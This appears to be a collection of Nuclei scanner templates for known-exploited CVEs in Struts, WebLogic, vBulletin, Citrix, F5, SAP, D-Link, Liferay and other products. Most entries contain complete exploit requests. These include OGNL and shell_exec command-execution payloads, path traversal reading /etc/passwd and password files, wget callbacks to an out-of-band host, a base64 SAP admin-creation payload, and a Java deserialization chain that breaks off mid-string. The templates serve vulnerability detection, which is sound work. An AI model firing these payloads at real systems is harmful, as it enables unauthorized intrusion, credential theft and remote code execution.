- KevinLab is a venture company specialized in IoT, Big Data, A.I based energy management platform. KevinLAB's BEMS (Building Energy Management System) enables efficient energy management in buildings by collecting and analyzing various information of energy usage and facilities as well as efficiency and indoor environment control.
- severity - info
- tags - iot,kevinlab

## Requests

- Method - GET

### URL

- {{BaseURL}}/pages/
- {{BaseURL}}/dashboard/

### Matchers

**Type - word**

- words
  1. \<title>BEMS\</title>
  2. ../http/index.php
- part - body
- condition - and

**Type - word**

- words
  1. \<title>HEMS\</title>
  2. ../dashboard/proc.php
- part - body
- condition - and

---

# Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution

## Description

- In Struts 2 before 2.3.15.1 the information following "action:", "redirect:", or "redirectAction:" is not properly sanitized and will be evaluated as an OGNL expression against the value stack. This introduces the possibility to inject server side code.
- severity - critical
- tags - cve,cve2013,rce,struts,apache,ognl,kev

## Requests

### Step - 1

```
GET /index.action?{{params}}:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 2

```
GET /login.action?{{params}}:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 3

```
GET /index.action?{{params}}%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - status**

- condition - or
- status
  1. 200
  2. 400

**Type - regex**

- part - body
- regex
  1. ((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)

**Payloads**- params

---

# Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI

## Description

- Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.
- severity - high
- tags - adobe,kev,vulhub,cve,cve2010,coldfusion,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en

### Matchers

**Type - word**

- words
  1. rdspassword=
  2. encrypted=
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Ghostcat - Apache Tomcat - AJP File Read/Inclusion Vulnerability

## Description

- When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.
- severity - critical
- tags - cisa,tenable,cve2020,apache,lfi,network,kev,cve,tomcat

---

# DrayTek - Remote Code Execution

## Description

- DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI.
- severity - critical
- tags - cve,cve2020,rce,kev

## Requests

### Step - 1

```
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: {{Hostname}}

action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# vBulletin 5.5.4 - 5.6.2- Remote Command Execution

## Description

- vBulletin versions 5.5.4 through 5.6.2 allow remote command execution via crafted subWidgets data in an ajax/render/widget_tabbedcontainer_tab_panel request. NOTE: this issue exists because of an incomplete fix for CVE-2019-16759.
- severity - critical
- tags - vbulletin,rce,kev,tenable,seclists,cve,cve2020

## Requests

### Step - 1

```
POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('cat ../../../../../../../../../../../../etc/passwd'); exit;"

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Cisco Adaptive Security Appliance (ASA)/Firepower Threat Defense (FTD) - Local File Inclusion

## Description

- Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software is vulnerable to local file inclusion due to directory traversal attacks that can read sensitive files on a targeted system because of a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.

- severity - high
- tags - lfi,kev,packetstorm,cve,cve2020,cisco

## Requests

- Method - GET

### URL

- {{BaseURL}}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
- {{BaseURL}}/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua

### Matchers

**Type - word**

- words
  1. INTERNAL_PASSWORD_ENABLED
  2. CONF_VIRTUAL_KEYBOARD
- condition - and

---

# Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution

## Description

- The Oracle Fusion Middleware WebLogic Server admin console in versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is vulnerable to an easily exploitable vulnerability that allows high privileged attackers with network access via HTTP to compromise Oracle WebLogic Server.
- severity - high
- tags - oracle,rce,weblogic,kev,packetstorm,cve,cve2020

## Requests

### Step - 1

```
POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
CMD: {{cmd}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("CMD");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')

```

### Matchers

**Type - word**

- part - header
- words
  1. ADMINCONSOLESESSION

**Type - word**

- part - body
- words
  1. uid=
  2. gid=
  3. groups=
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- regex
  1. (u|g)id=.\*

**Payloads**- cmd

---

# Spring Cloud Config Server - Local File Inclusion

## Description

- Spring Cloud Config Server versions 2.2.x prior to 2.2.3, versions 2.1.x prior to 2.1.9, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user or attacker can send a request using a specially crafted URL that can lead to a local file inclusion attack.
- severity - high
- tags - cve,cve2020,lfi,springcloud,config,traversal,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Cisco ASA/FTD Software - Cross-Site Scripting

## Description

- Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software are vulnerable to cross-site scripting and could allow an unauthenticated, remote attacker to conduct attacks against a user of the web services interface of an affected device. The vulnerabilities are due to insufficient validation of user-supplied input by the web services interface of an affected device. An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link. A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations. For more information, see the reference links.

- severity - medium
- tags - cve,cve2020,xss,cisco,kev

## Requests

### Step - 1

```
POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E

```

### Matchers

**Type - word**

- words
  1. \<svg/onload=alert(/{{randstr}}/)>
- part - body

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

---

# OpenSMTPD 6.4.0-6.6.1 - Remote Code Execution

## Description

- OpenSMTPD versions 6.4.0 - 6.6.1 are susceptible to remote code execution. smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation.

- severity - critical
- tags - cve,cve2020,smtp,opensmtpd,network,rce,oast,kev

---

# Citrix - Local File Inclusion

## Description

- Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 are vulnerable to local file inclusion because they allow unauthenticated access to certain URL endpoints.
- severity - medium
- tags - cve,cve2020,citrix,lfi,kev,packetstorm

## Requests

### Step - 1

```
POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
X-NITRO-USER: xpyZxwy6
X-NITRO-PASS: xWXHUJ56

<appfwprofile><login></login></appfwprofile>

```

### Step - 2

```
GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /menu/neo HTTP/1.1
Host: {{Hostname}}

```

### Step - 4

```
GET /menu/stc HTTP/1.1
Host: {{Hostname}}

```

### Step - 5

```
POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
X-NITRO-USER: oY39DXzQ
X-NITRO-PASS: ZuU9Y9c1
rand_key: {{randkey}}

<appfwprofile><login></login></appfwprofile>

```

### Step - 6

```
POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
X-NITRO-USER: oY39DXzQ
X-NITRO-PASS: ZuU9Y9c1
rand_key: {{randkey}}

<clipermission></clipermission>

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

### Extractors

**Type - regex**

- name - randkey
- part - body
- internal - True
- regex
  1. (?m)[0-9]{3,10}\.[0-9]+

---

# Airflow Experimental \<1.10.11 - REST API Auth Bypass

## Description

- Airflow's Experimental API prior 1.10.11 allows all API requests without authentication.

- severity - critical
- tags - packetstorm,cve,cve2020,apache,airflow,unauth,auth-bypass,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/experimental/latest_runs

### Matchers

**Type - word**

- part - body
- words
  1. "dag_run_url":
  2. "dag_id":
  3. "items":
- condition - and

---

# playSMS \<1.4.3 - Remote Code Execution

## Description

- PlaySMS before version 1.4.3 is susceptible to remote code execution because it double processes a server-side template.
- severity - critical
- tags - cve,cve2020,ssti,playsms,rce,unauth,kev

## Requests

### Step - 1

```
GET /index.php?app=main&inc=core_auth&route=login HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Step - 2

```
POST /index.php?app=main&inc=core_auth&route=login&op=login HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

X-CSRF-Token={{csrf}}&username=%7B%7B%60echo%20%27CVE-2020-8644%27%20%7C%20rev%60%7D%7D&password=

```

### Matchers

**Type - word**

- part - body
- words
  1. 4468-0202-EVC

**Type - status**

- status
  1. 200

### Extractors

**Type - xpath**

- name - csrf
- part - body
- attribute - value
- internal - True
- xpath
  1. /html/body/div[1]/div/div/table/tbody/tr[2]/td/table/tbody/tr/td/form/input

---

# F5 BIG-IP TMUI - Remote Code Execution

## Description

- F5 BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.
- severity - critical
- tags - cve2020,bigip,rce,kev,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
- {{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
- {{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
- {{BaseURL}}/hsqldb%0a

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. BIG-IP release ([\d.]+)
  3. [a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{7}
  4. HSQL Database Engine Servlet
- condition - or

---

# SAP Solution Manager 7.2 - Remote Command Execution

## Description

- SAP Solution Manager (SolMan) running version 7.2 has a remote command execution vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem). The vulnerability occurs due to missing authentication checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents, send HTTP request (SSRF), and execute OS commands on connected SMDAgent.
- severity - critical
- tags - cve,cve2020,sap,solman,rce,kev

## Requests

### Step - 1

```
POST /EemAdminService/EemAdmin HTTP/1.1
Host: {{Hostname}}
SOAPAction: ""
Content-Type: text/xml; charset=UTF-8
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/"><soapenv:Header/><soapenv:Body><adm:getAllAgentInfo/></soapenv:Body></soapenv:Envelope>

```

### Matchers

**Type - word**

- words
  1. :Envelope
  2. :Body
  3. :getAllAgentInfoResponse
- part - body
- condition - and

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. text/xml
  2. SAP NetWeaver Application Server
- part - header
- condition - and

---

# Sophos UTM Preauth - Remote Code Execution

## Description

- Sophos SG UTMA WebAdmin is susceptible to a remote code execution vulnerability in versions before v9.705 MR5, v9.607 MR7, and v9.511 MR11.
- severity - critical
- tags - cve,cve2020,sophos,rce,oast,unauth,kev

## Requests

### Step - 1

```
POST /var HTTP/1.1
Host: {{Hostname}}
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.5.1.1
Content-Type: application/json; charset=UTF-8
Origin: {{BaseURL}}
Connection: close
Referer: {{BaseURL}}
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"objs": [{"FID": "init"}], "SID": "|wget http://{{interactsh-url}}|", "browser": "gecko_linux", "backend_version": -1, "loc": "", "_cookie": null, "wdebug": 0, "RID": "1629210675639_0.5000855117488202", "current_uuid": "", "ipv6": true}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# MobileIron Core & Connector \<= v10.6 & Sentry \<= v9.8 - Remote Code Execution

## Description

- A remote code execution vulnerability in MobileIron Core & Connector versions 10.3.0.3 and earlier, 10.4.0.0, 10.4.0.1, 10.4.0.2, 10.4.0.3, 10.5.1.0, 10.5.2.0 and 10.6.0.0; and Sentry versions 9.7.2 and earlier, and 9.8.0; and Monitor and Reporting Database (RDB) version 2.0.0.1 and earlier contain a vulnerability that allows remote attackers to execute arbitrary code via unspecified vectors.
- severity - critical
- tags - cve,cve2020,mobileiron,rce,sentry,kev

## Requests

### Step - 1

```
POST /mifs/.;/services/LogService HTTP/1.1
Host: {{Hostname}}
Referer: https://{{Hostname}}
Content-Type: x-application/hessian
Connection: close

{{hex_decode('630200480004')}}

```

### Matchers

**Type - word**

- words
  1. application/x-hessian
- part - header

**Type - status**

- status
  1. 200

---

# SAP NetWeaver AS JAVA 7.30-7.50 - Remote Admin Addition

## Description

- SAP NetWeaver AS JAVA (LM Configuration Wizard), versions 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system.
- severity - critical
- tags - cve,cve2020,sap,kev,cisa

## Requests

### Step - 1

```
POST /CTCWebService/CTCWebServiceBean/ConfigServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=UTF-8
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi"><soapenv:Header/><soapenv:Body><urn:executeSynchronious><identifier><component>sap.com/tc~lm~config~content</component><path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path></identifier><contextMessages><baData>
  CiAgICAgICAgICAgIDxQQ0s+CiAgICAgICAgICAgIDxVc2VybWFuYWdlbWVudD4KICAgICAgICAgICAgICA8U0FQX1hJX1BDS19DT05GSUc+CiAgICAgICAgICAgICAgICA8cm9sZU5hbWU+QWRtaW5pc3RyYXRvcjwvcm9sZU5hbWU+CiAgICAgICAgICAgICAgPC9TQVBfWElfUENLX0NPTkZJRz4KICAgICAgICAgICAgICA8U0FQX1hJX1BDS19DT01NVU5JQ0FUSU9OPgogICAgICAgICAgICAgICAgPHJvbGVOYW1lPlRoaXNJc1JuZDczODA8L3JvbGVOYW1lPgogICAgICAgICAgICAgIDwvU0FQX1hJX1BDS19DT01NVU5JQ0FUSU9OPgogICAgICAgICAgICAgIDxTQVBfWElfUENLX01PTklUT1I+CiAgICAgICAgICAgICAgICA8cm9sZU5hbWU+VGhpc0lzUm5kNzM4MDwvcm9sZU5hbWU+CiAgICAgICAgICAgICAgPC9TQVBfWElfUENLX01PTklUT1I+CiAgICAgICAgICAgICAgPFNBUF9YSV9QQ0tfQURNSU4+CiAgICAgICAgICAgICAgICA8cm9sZU5hbWU+VGhpc0lzUm5kNzM4MDwvcm9sZU5hbWU+CiAgICAgICAgICAgICAgPC9TQVBfWElfUENLX0FETUlOPgogICAgICAgICAgICAgIDxQQ0tVc2VyPgogICAgICAgICAgICAgICAgPHVzZXJOYW1lIHNlY3VyZT0idHJ1ZSI+c2FwUnBvYzYzNTE8L3VzZXJOYW1lPgogICAgICAgICAgICAgICAgPHBhc3N3b3JkIHNlY3VyZT0idHJ1ZSI+U2VjdXJlIVB3RDg4OTA8L3Bhc3N3b3JkPgogICAgICAgICAgICAgIDwvUENLVXNlcj4KICAgICAgICAgICAgICA8UENLUmVjZWl2ZXI+CiAgICAgICAgICAgICAgICA8dXNlck5hbWU+VGhpc0lzUm5kNzM4MDwvdXNlck5hbWU+CiAgICAgICAgICAgICAgICA8cGFzc3dvcmQgc2VjdXJlPSJ0cnVlIj5UaGlzSXNSbmQ3MzgwPC9wYXNzd29yZD4KICAgICAgICAgICAgICA8L1BDS1JlY2VpdmVyPgogICAgICAgICAgICAgIDxQQ0tNb25pdG9yPgogICAgICAgICAgICAgICAgPHVzZXJOYW1lPlRoaXNJc1JuZDczODA8L3VzZXJOYW1lPgogICAgICAgICAgICAgICAgPHBhc3N3b3JkIHNlY3VyZT0idHJ1ZSI+VGhpc0lzUm5kNzM4MDwvcGFzc3dvcmQ+CiAgICAgICAgICAgICAgPC9QQ0tNb25pdG9yPgogICAgICAgICAgICAgIDxQQ0tBZG1pbj4KICAgICAgICAgICAgICAgIDx1c2VyTmFtZT5UaGlzSXNSbmQ3MzgwPC91c2VyTmFtZT4KICAgICAgICAgICAgICAgIDxwYXNzd29yZCBzZWN1cmU9InRydWUiPlRoaXNJc1JuZDczODA8L3Bhc3N3b3JkPgogICAgICAgICAgICAgIDwvUENLQWRtaW4+CiAgICAgICAgICAgIDwvVXNlcm1hbmFnZW1lbnQ+CiAgICAgICAgICA8L1BDSz4KICAgIA==
</baData><name>userDetails</name></contextMessages></urn:executeSynchronious></soapenv:Body></soapenv:Envelope>

```

### Matchers

**Type - word**

- words
  1. CTCWebServiceSi
  2. SOAP-ENV
- part - body
- condition - and

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. text/xml
  2. SAP NetWeaver Application Server
- part - header

---

# SolarWinds Orion API - Auth Bypass

## Description

- SolarWinds Orion API is vulnerable to an authentication bypass vulnerability that could allow a remote attacker to execute API commands. This vulnerability could allow a remote attacker to bypass authentication and execute API commands which may result in a compromise of the SolarWinds instance. SolarWinds Orion Platform versions 2019.4 HF 5, 2020.2 with no hotfix installed, and 2020.2 HF 1 are affected.

- severity - critical
- tags - cve,cve2020,solarwinds,rce,auth-bypass,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/web.config.i18n.ashx?l=nuclei&v=nuclei
- {{BaseURL}}/SWNetPerfMon.db.i18n.ashx?l=nuclei&v=nuclei

### Matchers

**Type - word**

- part - body
- words
  1. SolarWinds.Orion.Core.
  2. Connection String
- condition - or

**Type - word**

- part - header
- words
  1. text/plain

**Type - status**

- status
  1. 200

---

# D-Link DNS-320 - Unauthenticated Remote Code Execution

## Description

- D-Link DNS-320 FW v2.06B01 Revision Ax is susceptible to a command injection vulnerability in a system_mgr.cgi component. The component does not successfully sanitize the value of the HTTP parameters f_ntp_server, which in turn leads to arbitrary command execution.
- severity - critical
- tags - cve,cve2020,dlink,rce,oast,mirai,unauth,router,kev

## Requests

### Step - 1

```
POST /cgi-bin/system_mgr.cgi? HTTP/1.1
Host: {{Hostname}}
Accept: */*

C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}`

```

### Step - 2

```
POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}` HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Apache Airflow \<=1.10.10 - Remote Code Execution

## Description

- Apache Airflow versions 1.10.10 and below are vulnerable to remote code/command injection vulnerabilities in one of the example DAGs shipped with Airflow. This could allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use).
- severity - high
- tags - cve,cve2020,apache,airflow,rce,kev

## Requests

### Step - 1

```
GET /api/experimental/test HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 2

```
GET /api/experimental/dags/example_trigger_target_dag/paused/false HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 3

```
POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/json

{"conf": {"message": "\"; touch test #"}}

```

### Step - 4

```
GET /api/experimental/dags/example_trigger_target_dag/dag_runs/{{exec_date}}/tasks/bash_task HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_4, "operator":"BashOperator")
  2. contains(all_headers_4, "application/json")
- condition - and

### Extractors

**Type - regex**

- name - exec_date
- part - body
- group - 1
- internal - True
- regex
  1. "execution_date":"([0-9-A-Z:+]+)"

---

# SaltStack \<=3002 - Shell Injection

## Description

- SaltStack Salt through 3002 allows an unauthenticated user with network access to the Salt API to use shell injections to run code on the Salt-API using the SSH client.
- severity - critical
- tags - vulhub,cve,cve2020,saltstack,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/run
  - token=1337&client=ssh&tgt=\*&fun=a&roster=projectdiscovery&ssh_priv=nuclei

### Matchers

**Type - status**

- status
  1. 500

**Type - word**

- words
  1. application/json
- part - header

**Type - word**

- words
  1. An unexpected error occurred
- part - body

---

# Liferay Portal Unauthenticated \< 7.2.1 CE GA2 - Remote Code Execution

## Description

- Liferay Portal prior to 7.2.1 CE GA2 allows remote attackers to execute arbitrary code via JSON web services (JSONWS).
- severity - critical
- tags - cve,cve2020,rce,liferay,kev

## Requests

### Step - 1

```
POST /api/jsonws/invoke HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData
cmd2: {{command}}

cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C